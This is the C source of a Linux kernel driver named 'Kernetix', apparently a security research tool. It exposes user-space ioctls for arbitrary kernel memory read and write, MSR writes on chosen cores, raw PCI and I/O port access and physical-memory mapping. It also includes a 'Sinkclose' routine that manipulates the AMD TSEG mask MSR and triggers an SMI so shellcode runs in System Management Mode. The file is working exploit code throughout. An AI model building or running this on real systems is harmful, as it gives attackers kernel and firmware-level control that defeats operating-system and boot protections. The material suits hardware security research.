/*
** Kernetix Device Driver for fun and profit
*/

#include <linux/version.h>
#include <linux/init.h>
#include <linux/module.h>  /* Needed by all modules */
#include <linux/kernel.h>  /* Needed for KERN_ALERT */
#include <linux/kdev_t.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/err.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/ioctl.h>
#include <linux/mutex.h>
#include <linux/sched.h> // For accessing current process descriptor and mm_struct
#include <asm/uaccess.h>
#include <linux/uaccess.h>
#include <linux/mm.h>
#include <linux/string.h>
#include <linux/atomic.h>

#include "kernetix.h"

#include <linux/efi.h>
#include <asm/io.h>
#include <linux/highmem.h>   // For kmap and kunmap



///////////////////////////////////////////////////////////////////////////

typedef struct _KERNETIX_DEVICE 
{
  unsigned char *data;
  unsigned long buffer_size; 
  unsigned long block_size;  
  struct mutex kernetix_mutex; 
  struct cdev cdev;
} KERNETIX_DEVICE, *PKERNETIX_DEVICE;

int kernetix_major =   KERNETIX_MAJOR;
int kernetix_minor =   0;

static int kernetix_ndevices = 1;

static PKERNETIX_DEVICE kernetix_device = NULL;
static struct class *device_class = NULL;

#define SINKCLOSE_CORE1_RECOVER_PHYSICAL_ADDR 0x3000
#define CORE1_FAKE_STATE_AREA 0x200
static void *sinkclose_core1_recover_vaddr;
static struct page *sinkclose_core1_recover_page;

#define IA32_EFER 0xC0000080

///////////////////////////////////////////////////////////////////////////

/// @todo implement this correctly 
int is_pml5_enabled(void) {
    // UINT64 val = 0;
    // _rdmsr(IA32_EFER, &val);
    // return (val >> 12) & 1;
    return 0;
}

#define PML5_INDEX(virt_addr) (((virt_addr) >> 48) & 0x1FF)
#define PML4_INDEX(virt_addr) (((virt_addr) >> 39) & 0x1FF)
#define PDPT_INDEX(virt_addr) (((virt_addr) >> 30) & 0x1FF)
#define PD_INDEX(virt_addr) (((virt_addr) >> 21) & 0x1FF)
#define PT_INDEX(virt_addr) (((virt_addr) >> 12) & 0x1FF)

#define PFN_MASK 0x000FFFFFFFFFF000ULL

static inline unsigned long get_cr3(void)
{
    unsigned long cr3;
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    return cr3;
}

/// Gets the PFN by walking the paging structures
static uint64_t va2pa(uint64_t virt_addr)
{
        uint64_t cr3 = get_cr3();

        uint64_t pml4 = 0;

        if (is_pml5_enabled()) {
          uint64_t pml5 = cr3 & 0xFFFFFFFFF000;
          printk(KERN_INFO "pml5: %016llx\n", pml5);
          uint64_t pml4_entry = *(uint64_t *)((pml5 + __PAGE_OFFSET) + (PML5_INDEX(virt_addr)) * 8);
          pml4 = (pml4_entry & PFN_MASK);
        } else {
          pml4 = cr3 & 0xFFFFFFFFF000;
        }

        printk(KERN_INFO "pml4: %016llx\n", pml4);

        uint64_t pdpt_entry = *(uint64_t *)((pml4 + __PAGE_OFFSET) + (PML4_INDEX(virt_addr)) * 8);
        uint64_t pdpt = (pdpt_entry & PFN_MASK);
        printk(KERN_INFO "pdpt: %016llx\n", pdpt);
        if (pdpt_entry & (1ULL << 7))
        { // Check if PDPTE is a large page
                return pdpt;
        }
        else if (pdpt == 0) 
        {
                printk(KERN_INFO "pdpt not present?");
                return 0;
        }

        uint64_t pd_entry = *(uint64_t *)((pdpt + __PAGE_OFFSET) + (PDPT_INDEX(virt_addr)) * 8);
        uint64_t pd = (pd_entry & PFN_MASK);
        printk(KERN_INFO "pd: %016llx\n", pd);
        if (pd_entry & (1ULL << 7))
        { // Check if PDE is a large page
                return pd;
        }
        else if (pd == 0) 
        {
                printk(KERN_INFO "pd not present?");
                return 0;
        }

        uint64_t pt_entry = *(uint64_t *)((pd + __PAGE_OFFSET) + (PD_INDEX(virt_addr)) * 8);
        uint64_t pt = (pt_entry & PFN_MASK);
        printk(KERN_INFO "pt: %016llx\n", pt);
        if (pt_entry & (1ULL << 7))
        { // Check if PTE is a large page
                return pt;
        }
        else if (pt == 0) 
        {
                printk(KERN_INFO "pt not present?");
                return 0;
        }

        uint64_t *pte = (uint64_t *)(((pt & PFN_MASK) + __PAGE_OFFSET) + (PT_INDEX(virt_addr)) * 8);
        printk(KERN_INFO "pte: %016llx\n", *pte);
        return *pte & PFN_MASK;
}


static int kernetix_open(struct inode *inodep, struct file *filep){   
   printk(KERN_INFO "kernetix device has been opened\n");
   return 0;
}

static int kernetix_release(struct inode *inodep, struct file *filep){
   printk(KERN_INFO "kernetix device successfully closed\n");
   return 0;
}

int device_mmap(struct file *filp, struct vm_area_struct *vma)
{
    unsigned long offset = vma->vm_pgoff;

    if (offset >= __pa(high_memory) || (filp->f_flags & O_SYNC))
        #if LINUX_VERSION_CODE < KERNEL_VERSION(6, 3, 0) // linux bc292ab00f6c
                vma->vm_flags |= VM_IO;
        #else
                vm_flags_set(vma, VM_IO);
        #endif

    #if LINUX_VERSION_CODE < KERNEL_VERSION(6, 3, 0) // linux bc292ab00f6c
            vma->vm_flags |= (VM_DONTEXPAND | VM_DONTDUMP);
    #else
            vm_flags_set(vma, VM_DONTEXPAND | VM_DONTDUMP);
    #endif

    if (io_remap_pfn_range(vma, vma->vm_start, offset, 
        vma->vm_end-vma->vm_start, vma->vm_page_prot))
        return -EAGAIN;
    return 0;
}


static void read_msr_for_core(void *info) {  
  PREAD_MSR_FOR_CORE_CALL ptr = (PREAD_MSR_FOR_CORE_CALL) info;
  _rdmsr(ptr->msr, &ptr->result);    
}

static void write_msr_for_core(void *info) {  
  PWRITE_MSR_FOR_CORE_CALL ptr = (PWRITE_MSR_FOR_CORE_CALL) info;
  _wrmsr(ptr->msr, ptr->value);    
}





static atomic_t core1_staging_executed = ATOMIC_INIT(0);
static atomic_t core1_staging_finished = ATOMIC_INIT(0);

static void core1_staging(void *info) {
    printk(KERN_INFO "CORE1 entering staging");
    // Set prepared to 0
    atomic_set(&core1_staging_finished, 0);

    // Signal Core0 that this is executing
    atomic_inc_return(&core1_staging_executed);

    // busy wait until SMI finishes
    while ((atomic_cmpxchg(&core1_staging_finished, 1, 1) != 1));

    printk(KERN_INFO "CORE1 exiting Staging");
}


static atomic_t core1_sinkclose_executed = ATOMIC_INIT(0);
static atomic_t core1_sinkclose_finished = ATOMIC_INIT(0);

static void core1_sinkclose(void *info) {
    printk(KERN_INFO "CORE1 entering sinkclose");

    // Set prepared to 0
    atomic_set(&core1_sinkclose_finished, 0);

    // Save current RIP, RBP, RSP, and CR3 into CORE1_FAKE_STATE_AREA
    _store_savestate((char *)sinkclose_core1_recover_vaddr + CORE1_FAKE_STATE_AREA);

    // Signal Core0 that this is executing
    atomic_set(&core1_sinkclose_executed, 1);

    // local_irq_disable();
    // asm volatile("hlt");

    // busy wait until SMI finishes
    while ((atomic_cmpxchg(&core1_sinkclose_finished, 1, 1) != 1));
      

    printk(KERN_INFO "CORE1 exiting sinkclose");
}

#define AMD_MSR_SMM_TSEG_MASK  0xC0010113
static void sinkclose_exploit(void *info) {  
    UINT64 tseg_mask = 0;
    SW_SMI_CALL *smi = (SW_SMI_CALL *) info;
    printk(KERN_INFO "sinkclose_exploit executing on CPU %d\n", smp_processor_id());

    printk(KERN_ALERT "Value of rax --> %016llx\n", smi->rax );

    // Used for an initial preparation of the SAVE STATE AREA
    if (smi->rax == 0x31337) {

        // Set core1_stating_executed to 0
        atomic_set(&core1_staging_executed, 0);

        call_single_data_t csd;
		    INIT_CSD(&csd, core1_staging, NULL);

        // Schedule the callback to be executed on CPU 1 asynchronously
        smp_call_function_single_async(1, &csd);

        // Busy wait until Core1 executes
        while ((atomic_cmpxchg(&core1_staging_executed, 1, 1) != 1));

        // Executes SWSMI 
        // This is done to save the registers of Core0 and Core1 into SMM SAVE STATE
        _swsmi(smi);

        // Signal Core1 that it can continue
        atomic_inc_return(&core1_staging_finished);

    } else if (smi->rax == 0x31338) {      
        printk(KERN_INFO "CORE0 entering sinkclose");

        // Set core1_stating_executed to 0
        atomic_set(&core1_sinkclose_executed, 0);

        call_single_data_t csd;
        INIT_CSD(&csd, core1_sinkclose, NULL);

        // Schedule the callback to be executed on CPU 1 asynchronously
        smp_call_function_single_async(1, &csd);

        // Busy wait until Core1 executes
        while ((atomic_cmpxchg(&core1_sinkclose_executed, 1, 1) != 1));

        // Executes SWSMI with TClose Enabled
        _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
        tseg_mask = tseg_mask | (0b11 << 2);
        _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
        _swsmi(smi);

        // Signal Core1 that it can continue
        atomic_inc_return(&core1_sinkclose_finished);

        printk(KERN_INFO "CORE0 sinkclose executed shellcode");
    }

    printk(KERN_INFO "sinkclose_exploit finished");

}

static long int kernetix_ioctl(struct file *file, 
    unsigned int cmd, unsigned long carg )
{
	void __user * p = (void __user *)carg;
	
	struct _kernel_write *kwrite = NULL;
	struct _kernel_read *kread = NULL;
  IO_PORT_CALL _io;
	unsigned long _cr3;
  UINT64 addr_result;
  struct virt_to_phys _v2p;
  int ret = 0;
  int err;

  printk(KERN_ALERT "==> The IOCTL for %#08x was called\n", cmd);

  switch (cmd)
  {		
      case KERNETIX_ABW:
      {
        printk(KERN_ALERT "The IOCTL for ABW %#08lx was called :)\n", KERNETIX_ABW);
        kwrite = kzalloc(sizeof(struct _kernel_write), GFP_KERNEL);
        
            if ( copy_from_user(kwrite, p, sizeof(struct _kernel_write)) != 0)
              return -EINVAL;  

        printk(KERN_ALERT "Address: %p\n", kwrite->address );
        printk(KERN_ALERT "Content: %p\n", *(void **)(kwrite->address) );
        
        printk(KERN_ALERT "Value of %p --> %p\n", kwrite->address,
             *(void **)(kwrite->address) );
        
        printk(KERN_ALERT "The new value is %p\n", kwrite->value);	
        
        put_user(*(void **)(kwrite->address), &(((struct _kernel_write *)p)->old_value));
        
        *(void **)(kwrite->address) = kwrite->value;	  
        
        kfree(kwrite);		  
            break;
      }
      case KERNETIX_ABR:
      {
        printk(KERN_ALERT "The IOCTL for ABR %#08lx was called :)\n", KERNETIX_ABR);  
        kread = kzalloc(sizeof(struct _kernel_read), GFP_KERNEL);		  
        
        if ( copy_from_user(kread, p, sizeof(struct _kernel_read)) != 0)
        return -EINVAL; 

        printk(KERN_ALERT "Value of %016lx --> %016lx\n",
             kread->address, *(void **)(kread->address) );  
      
        put_user(*(void **)(kread->address), &(((struct _kernel_read *)p)->value));
        
        kfree(kread);
        break;
      }
      case KERNETIX_CR3:
      {
        printk(KERN_ALERT "The IOCTL for CR3 %#08lx was called :)\n", KERNETIX_CR3);
             
        printk(KERN_ALERT "Value of PGD Virtual Address --> %p\n",
             ((struct mm_struct *)current->mm)->pgd);
            
        __asm__("mov %%cr3, %%rax" : "=a" (_cr3));			       
        
        printk(KERN_ALERT "Value of CR3 (Physical Address) --> %p\n", (void *)_cr3);
        copy_to_user(p, &_cr3, sizeof(_cr3));
        
        break;
      }
      case IOCTL_ISSUE_SW_SMI:
      {
        SW_SMI_CALL *swsmi_call = (SW_SMI_CALL *) kzalloc(sizeof(SW_SMI_CALL), GFP_KERNEL);		  
        
        if ( copy_from_user(swsmi_call, p, sizeof(SW_SMI_CALL)) != 0)
          return -EINVAL; 

        printk(KERN_ALERT "Value of rbx --> %llx\n", swsmi_call->rbx );

        _swsmi(swsmi_call);

        kfree(swsmi_call);
        break;
        
      }

      case IOCTL_SINKCLOSE:
      {
        // AVOID Executing this from CPU-1
        printk(KERN_INFO "Sinkclose attack started on CPU %d\n", smp_processor_id());
        if (smp_processor_id() ==  1) {
          return -EINVAL;
        }

        SW_SMI_CALL *swsmi_call = (SW_SMI_CALL *) kzalloc(sizeof(SW_SMI_CALL), GFP_KERNEL);	

        if ( copy_from_user(swsmi_call, p, sizeof(SW_SMI_CALL)) != 0)
          return -EINVAL; 

        unsigned long pfn = SINKCLOSE_CORE1_RECOVER_PHYSICAL_ADDR / PAGE_SIZE;

        sinkclose_core1_recover_page = pfn_to_page(pfn);
        if (!sinkclose_core1_recover_page) {
            printk(KERN_ERR "Failed to get page from PFN\n");
            return -ENOMEM;
        }

        sinkclose_core1_recover_vaddr = kmap(sinkclose_core1_recover_page);

        if (!sinkclose_core1_recover_vaddr) {
            printk(KERN_ERR "Failed to map SINKCLOSE_CORE1_RECOVER_PHYSICAL_ADDR\n");
            return -ENOMEM;
        }
        

        // Execute the callback on the target CPU
        ret = smp_call_function_single(
              0,    // TARGET CPU is 0
              sinkclose_exploit,
              (void *) swsmi_call, 
              1  // WAIT
        );

        if (sinkclose_core1_recover_page) {
            kunmap(sinkclose_core1_recover_page);
            sinkclose_core1_recover_vaddr = 0;
        }

        if (ret) {
            printk(KERN_ERR "Failed to execute callback on CPU 0\n");
            return ret;
        }

        printk(KERN_INFO "Callback scheduled on CPU 0\n");

        break;
        
      }

      case IOCTL_READ_MSR:
      {         
        
        READ_MSR_CALL *msr_call = (READ_MSR_CALL *) kzalloc(sizeof(READ_MSR_CALL), GFP_KERNEL);		  
        
        if ( copy_from_user(msr_call, p, sizeof(READ_MSR_CALL)) != 0)
          return -EINVAL; 

        __u64 val = 0;          
        _rdmsr(msr_call->msr, &val);     
        
        copy_to_user((unsigned long *)msr_call->result , &val, sizeof(val));

        printk(KERN_INFO "Requested MSR --> %08x = %llx\n", msr_call->msr , val);

        kfree(msr_call);
        break;
        
      }

      case IOCTL_READ_MSR_FOR_CORE:
      {         
        printk(KERN_INFO "IOCTL_READ_MSR_FOR_CORE");            
        READ_MSR_FOR_CORE_CALL msr_for_core;

        if ( copy_from_user((void *) &msr_for_core, p, sizeof(READ_MSR_FOR_CORE_CALL)) != 0)
          return -EINVAL; 
        
        ret = smp_call_function_single(
              msr_for_core.core_id,    // TARGET CPU
              read_msr_for_core,
              (void *) &msr_for_core, 
              1  // WAIT
        );

        printk(KERN_INFO "MSR Value: %016llx\n", msr_for_core.result);

        if ( copy_to_user(p, (void *) &msr_for_core, sizeof(READ_MSR_FOR_CORE_CALL)) != 0)
          return -EINVAL; 

        break;
        
      }

      case IOCTL_WRITE_MSR:
      {         
        
        WRITE_MSR_CALL *msr_call = (WRITE_MSR_CALL *) kzalloc(sizeof(WRITE_MSR_CALL), GFP_KERNEL);		  
        
        if ( copy_from_user(msr_call, p, sizeof(WRITE_MSR_CALL)) != 0)
          return -EINVAL; 
       
        _wrmsr(msr_call->msr, msr_call->value);    
       
        printk(KERN_INFO "written %llx into MSR:[%08x] \n", msr_call->value, msr_call->msr);

        kfree(msr_call);
        break;        
      }

      case IOCTL_WRITE_MSR_FOR_CORE:
      {         
        printk(KERN_INFO "IOCTL_WRITE_MSR_FOR_CORE");            
        
        WRITE_MSR_FOR_CORE_CALL msr_for_core;

        if ( copy_from_user((void *) &msr_for_core, p, sizeof(WRITE_MSR_FOR_CORE_CALL)) != 0)
          return -EINVAL; 
        
        ret = smp_call_function_single(
              msr_for_core.core_id,    // TARGET CPU
              write_msr_for_core,
              (void *) &msr_for_core, 
              1  // WAIT
        );

        if ( copy_to_user(p, (void *) &msr_for_core, sizeof(WRITE_MSR_FOR_CORE_CALL)) != 0)
          return -EINVAL; 

        break;
        
      }

      case IOCTL_READ_PCI_BYTE:
      {         
        
        READ_PCI_DATA_CALL *pci_call = (READ_PCI_DATA_CALL *)
             kzalloc(sizeof(READ_PCI_DATA_CALL), GFP_KERNEL);		  
        
        if ( copy_from_user(pci_call, p, sizeof(READ_PCI_DATA_CALL)) != 0)
          return -EINVAL; 
       
        UINT32 bus      = pci_call->bus;
        UINT32 device   = pci_call->device;
        UINT32 function = pci_call->function;
        UINT32 offset   = pci_call->offset;
        UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | offset);
        
        BYTE val = 0;
        _read_pci_byte(CF8, &val);

        copy_to_user((unsigned long *)pci_call->result , &val, sizeof(val));
        
        kfree(pci_call);
        break;        
      }

      case IOCTL_READ_PCI_WORD:
      {         
        
        READ_PCI_DATA_CALL *pci_call = (READ_PCI_DATA_CALL *)
             kzalloc(sizeof(READ_PCI_DATA_CALL), GFP_KERNEL);		  
        
        if ( copy_from_user(pci_call, p, sizeof(READ_PCI_DATA_CALL)) != 0)
          return -EINVAL; 
       
        UINT32 bus      = pci_call->bus;
        UINT32 device   = pci_call->device;
        UINT32 function = pci_call->function;
        UINT32 offset   = pci_call->offset;
        UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
        
        WORD val = 0;
        _read_pci_word(CF8, &val);

        copy_to_user((unsigned long *)pci_call->result , &val, sizeof(val));
        
        kfree(pci_call);
        break;        
      }

      case IOCTL_READ_PCI_DWORD:
      {         
        
        READ_PCI_DATA_CALL *pci_call = (READ_PCI_DATA_CALL *)
             kzalloc(sizeof(READ_PCI_DATA_CALL), GFP_KERNEL);		  
        
        if ( copy_from_user(pci_call, p, sizeof(READ_PCI_DATA_CALL)) != 0)
          return -EINVAL; 
       
        UINT32 bus      = pci_call->bus;
        UINT32 device   = pci_call->device;
        UINT32 function = pci_call->function;
        UINT32 offset   = pci_call->offset;
        UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
        
        DWORD val = 0;
        _read_pci_dword(CF8, &val);

        copy_to_user((unsigned long *)pci_call->result , &val, sizeof(val));
        
        kfree(pci_call);
        break;        
      }

      case IOCTL_WRITE_PCI_BYTE:
      {         
        
        WRITE_PCI_DATA_CALL *pci_call = (WRITE_PCI_DATA_CALL *)
             kzalloc(sizeof(WRITE_PCI_DATA_CALL), GFP_KERNEL);		  
        
        if ( copy_from_user(pci_call, p, sizeof(WRITE_PCI_DATA_CALL)) != 0)
          return -EINVAL; 
       
        UINT32 bus      = pci_call->bus;
        UINT32 device   = pci_call->device;
        UINT32 function = pci_call->function;
        UINT32 offset   = pci_call->offset;
        UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));

        _write_pci_byte(CF8, pci_call->value);

        kfree(pci_call);
        break;        
      }

      case IOCTL_WRITE_PCI_WORD:
      {         
        
        WRITE_PCI_DATA_CALL *pci_call = (WRITE_PCI_DATA_CALL *)
             kzalloc(sizeof(WRITE_PCI_DATA_CALL), GFP_KERNEL);		  
        
        if ( copy_from_user(pci_call, p, sizeof(WRITE_PCI_DATA_CALL)) != 0)
          return -EINVAL; 
       
        UINT32 bus      = pci_call->bus;
        UINT32 device   = pci_call->device;
        UINT32 function = pci_call->function;
        UINT32 offset   = pci_call->offset;
        UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
        
        _write_pci_word(CF8, pci_call->value);
        
        kfree(pci_call);
        break;        
      }

      case IOCTL_WRITE_PCI_DWORD:
      {         
        
        WRITE_PCI_DATA_CALL *pci_call = (WRITE_PCI_DATA_CALL *)
             kzalloc(sizeof(WRITE_PCI_DATA_CALL), GFP_KERNEL);		  

        if ( copy_from_user(pci_call, p, sizeof(WRITE_PCI_DATA_CALL)) != 0)
          return -EINVAL; 
       
        UINT32 bus      = pci_call->bus;
        UINT32 device   = pci_call->device;
        UINT32 function = pci_call->function;
        UINT32 offset   = pci_call->offset;
        UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
        
        _write_pci_dword(CF8, pci_call->value);
        
        kfree(pci_call);
        break;        
      }

      case IOCTL_READ_PCI_HEADER:
      {         
        
        READ_PCI_CONFIGURATION_SPACE_CALL *pci_call = (READ_PCI_CONFIGURATION_SPACE_CALL *)
             kzalloc(sizeof(READ_PCI_CONFIGURATION_SPACE_CALL), GFP_KERNEL);		  

        if ( copy_from_user(pci_call, p, sizeof(READ_PCI_CONFIGURATION_SPACE_CALL)) != 0)
          return -EINVAL; 
       
        UINT32 bus      = pci_call->bus;
        UINT32 device   = pci_call->device;
        UINT32 function = pci_call->function;

        BYTE *pci_header = (BYTE *) kzalloc(1024, GFP_KERNEL);
        
        _read_pci_compatible_configuration_space(bus, device, function, pci_header);

        if ( copy_to_user(pci_call->buffer, pci_header, 256) != 0)
          return -EINVAL;        
        
        kfree(pci_header);
        kfree(pci_call);
        break;        
      }

      case IOCTL_GET_PCI_BAR_SIZE:
      {         
        
        READ_PCI_DATA_CALL *pci_call = (READ_PCI_DATA_CALL *)
             kzalloc(sizeof(READ_PCI_DATA_CALL), GFP_KERNEL);		  

        if ( copy_from_user(pci_call, p, sizeof(READ_PCI_DATA_CALL)) != 0)
          return -EINVAL; 
       
        UINT32 bus      = pci_call->bus;
        UINT32 device   = pci_call->device;
        UINT32 function = pci_call->function;
        UINT32 offset   = pci_call->offset;
        UINT32 CF8 = ((1 << 0x1F) | (bus << 0x10) | (device << 0xB) | (function << 0x08) | (offset));
        
        UINT64 bar_size = 0;
        _read_pci_bar_size(CF8, &bar_size);

        copy_to_user((unsigned long **)pci_call->result, &bar_size, sizeof(bar_size));

        kfree(pci_call);
        break;        
      }

      case IOCTL_GET_EFI_MEMMAP_ADDRESS: 
        printk(KERN_INFO "EFI Map at %016llx \n", &efi.memmap);                
        addr_result = (UINT64) &efi.memmap;        
        if (copy_to_user(p, (void *) &addr_result, sizeof(UINT64))) {
          printk(KERN_INFO, "error copying to user");
          return -EINVAL;
        }

        break;

      case IOCTL_READ_IO_PORT:
        if (copy_from_user(&_io, p, sizeof(IO_PORT_CALL))) {
                return -EINVAL;
        }

        _io.data = 0;

        switch(_io.size) {
                case IO_SIZE_BYTE:
                        _io.data = inb(_io.port);
                        break;
                case IO_SIZE_WORD:
                        _io.data = inw(_io.port);
                        break;
                case IO_SIZE_DWORD:
                        _io.data = inl(_io.port);
                        break;
                default:
                        return -EINVAL;
        }

        if (copy_to_user(p, &_io, sizeof(IO_PORT_CALL))) {
                pr_err("copy_to_user error!!\n");
        }
        break;

      case IOCTL_WRITE_IO_PORT:
        if (copy_from_user(&_io, p, sizeof(IO_PORT_CALL))) {
            return -EINVAL;
        }

        switch(_io.size) {
                case IO_SIZE_BYTE:
                        outb((uint8_t) _io.data, _io.port);
                        break;
                case IO_SIZE_WORD:
                        outw((uint16_t) _io.data, _io.port);
                        break;
                case IO_SIZE_DWORD:
                        outl(_io.data, _io.port);
                        break;
                default:
                        return -EINVAL;
        }

        break;

        case IOCTL_VIRT_TO_PHYS:
          printk(KERN_INFO "IOCTL_VIRT_TO_PHYS");
          err = copy_from_user(&_v2p, (void *)p, sizeof(struct virt_to_phys));
          if (err)
          {
            ret = -EINVAL;
          }
          _v2p.physaddr = (uint64_t)va2pa(_v2p.vaddr);
          if (copy_to_user((void *)p, &_v2p, sizeof(_v2p)))
          {
            pr_err("copy_to_user error!!\n");
            ret = -EINVAL;
          }
          break;
  }

  return ret;
}

struct file_operations fops = {
	.owner          = THIS_MODULE,
	//.read =     kernetix_read,
	//.write =    kernetix_write,
	.unlocked_ioctl = kernetix_ioctl,
	.open           = kernetix_open,
	.release        = kernetix_release,	
  .mmap           = device_mmap
};

///////////////////////////////////////////////////////////////////////////
void driver_cleanup(void)
{
  if (kernetix_device)
  {
	device_destroy(device_class, MKDEV(kernetix_major,kernetix_minor));
	cdev_del(&kernetix_device->cdev);
	kfree(kernetix_device->data);
	mutex_destroy(&kernetix_device->kernetix_mutex);
	kfree(kernetix_device);
  }

  if (device_class)
  {
    class_destroy(device_class);
  }
  unregister_chrdev_region(MKDEV(kernetix_major,kernetix_minor), kernetix_ndevices);
}

static int driver_initialize(void)
{
  int err = 0;  
  struct device *device = NULL;
  dev_t dev_number = 0;
  
  
   
  err = alloc_chrdev_region(&dev_number, kernetix_minor, kernetix_ndevices, KERNETIX_DEVICE_NAME);
  if (err < 0) 
  {
    printk(KERN_WARNING "[target] alloc_chrdev_region() failed\n");
    return err;
  }
  kernetix_major = MAJOR(dev_number);
  
  /* Create device class (before allocation of the device) */
  #if LINUX_VERSION_CODE < KERNEL_VERSION(6, 4, 0) // linux 1aaba11da9aa
      device_class = class_create(THIS_MODULE, KERNETIX_DEVICE_NAME);
  #else
      device_class = class_create(KERNETIX_DEVICE_NAME);
  #endif
  
  if (IS_ERR(device_class)) 
  {
    err = PTR_ERR(device_class);
    goto fail;
  }
  
  kernetix_device = (PKERNETIX_DEVICE) kzalloc(sizeof(struct _KERNETIX_DEVICE), GFP_KERNEL);
  if (!kernetix_device)
  {
  err = -ENOMEM;
  goto fail;
  }
  
  kernetix_device->data = NULL;     
  kernetix_device->buffer_size = KERNETIX_BUFFER_SIZE;
  kernetix_device->block_size = KERNETIX_BLOCK_SIZE;
  mutex_init(&kernetix_device->kernetix_mutex);	
  cdev_init(&kernetix_device->cdev, &fops);
  kernetix_device->cdev.owner = THIS_MODULE;
  
  err = cdev_add(&kernetix_device->cdev, dev_number, 1);
  if (err)
  {
  printk(KERN_WARNING "[target] Error %d while trying to add %s%d", err, KERNETIX_DEVICE_NAME, MINOR(dev_number));
  goto fail;
  }

  
  device = device_create(device_class, NULL, dev_number, NULL, KERNETIX_DEVICE_NAME "%d", MINOR(dev_number));

  if (IS_ERR(device)) 
  {
  err = PTR_ERR(device);
  printk(KERN_WARNING "[target] Error %d while trying to create %s%d", err, KERNETIX_DEVICE_NAME, MINOR(dev_number));
  cdev_del(&kernetix_device->cdev);
  goto fail;
  }
  
  return 0;
  
  fail:
    driver_cleanup();
    return err;
}

static int __init kernetix_init(void)
{
  printk(KERN_ALERT "Creating Device %s\n", KERNETIX_DEVICE_NAME);
  //printk(KERN_ALERT "efi_memmap: %016lx\n", efi.memmap);
  return driver_initialize();  
}

static void __exit kernetix_exit(void)
{
  printk(KERN_ALERT "Unloading %s\n", KERNETIX_DEVICE_NAME);
  driver_cleanup();  
}

module_init(kernetix_init);
module_exit(kernetix_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("n3k");
MODULE_DESCRIPTION("A test module for Arbitrary Write");